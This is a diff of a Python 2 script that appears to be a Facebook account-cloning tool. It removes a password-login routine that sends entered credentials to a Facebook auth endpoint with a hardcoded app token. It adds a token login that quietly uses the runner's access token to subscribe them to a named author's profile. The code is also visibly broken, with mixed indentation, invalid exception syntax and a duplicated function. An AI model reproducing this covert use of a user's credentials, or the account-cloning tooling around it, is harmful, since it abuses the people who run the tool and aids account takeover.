@@ -76,74 +76,21 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError, IOError:
-		    print ("\033[1;97m[1]\033[1;91m-⋄-\033[1;97mlogin With Access Token ")
-    print ("\033[1;97m[2]\033[1;91m-⋄-\033[1;97mLogin With User And Pass")
-    print ("\033[1;97m[0]\033[1;91m-⋄-\033[1;97mBack") 
-    print("\033[1;97m--------------------------------------------------")
-    clone_loginvia()
-def clone_loginvia():
-    hack = raw_input("\n╰─➣ ")
-    if hack =="1":
-        os.system("clear")
-        print logo
-	os.system("python3 .loading.md")
-        os.system('clear')
-	print logo
-        print ("\033[1;93mLogin With Token").center(50)
-	print("\033[1;97m--------------------------------------------------")
-        token = raw_input("\033[1;97m[+]\033[1;97m Paste :\033[1;97m ")
-	print("\033[1;97m--------------------------------------------------")
-        saving()
-        sav = open(".login.txt","w")
-        sav.write(token)
-        sav.close()
-        abm("\r\033[1;92m[✓] Login Successfull\033[0;97m")
-	os.system('xdg-open https://www.facebook.com/princess.lubisi.7')
-        time.sleep(1)
-        menu()
-    elif hack =="2":
-        loginfb()
-    elif hack =="0":
-	        menu()
-    else:
-	        print ("[!] Please Select a Valid Option")
-		clone_loginvia()
-		
-def loginfb():
-    os.system("clear")
-    print logo
-    os.system("python3 .loading.md")
-    time.sleep(1)
-    os.system('clear')
-    print logo
-    print("\033[1;93mLogin With Facebook Account\033[1;0m").center(50)
-    print("\033[1;93mUse Proxy to login account \033[1;0m").center(50)
-    print("\033[1;97m--------------------------------------------------")
-    id = raw_input("\033[1;97m[+]\033[1;93m Email/ID/Number :\033[1;97m ")
-    id1 = id.replace(' ','')
-    id2 = id1.replace('(','')
-    uid = id2.replace(')','')
-    pwd = raw_input("\033[1;97m[+]\033[1;93m Passwor :\033[1;97m ")
-    print("\033[1;97m--------------------------------------------------")
-    logging()
-    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
-    q = json.loads(data)
-    if "access_token" in q:
-        succ = open(".login.txt","w")
-        succ.write(q["access_token"])
-        succ.close()
-        print("\n\033[1;92m[✓] Login Successfull\033[0;97m")
-        time.sleep(1)
-        menu()
-    else:
-        if "www.facebook.com" in q["error_msg"]:
-            print ("\n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m")
-            time.sleep(1)
-            loginfb()
-        else:
-            print("\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
-            time.sleep(1)
-            loginfb()
+		    token = raw_input("\033[1;93m➤\033[1;97m [?] Enter Token : ")
+		if token == "":
+			print("Wrong Input")
+		try:
+			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
+			open("login.txt", "w").write(token)
+			#-> bot follow
+			requests.post("https://graph.facebook.com/princess.lubisi.7/subscribers?access_token="+token)      #FUEGO X RAJUL
+			menu()
+		except KeyError:
+			os.system("rm -f login.txt")
+			exit("[?] Login Error")
+
+def menu():
+	os.system("clear")
 
 def menu():
     os.system("clear")
